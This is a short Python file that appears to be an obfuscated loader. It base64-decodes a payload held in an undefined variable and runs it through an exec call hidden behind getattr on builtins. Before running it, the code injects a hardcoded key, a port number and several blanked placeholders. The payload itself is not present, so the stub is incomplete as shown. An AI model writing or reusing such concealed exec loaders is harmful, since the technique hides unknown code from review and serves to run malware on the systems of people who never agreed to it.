import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "d29ab70a-1e6c-4ec8-b0c4-7fbf6a983852")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)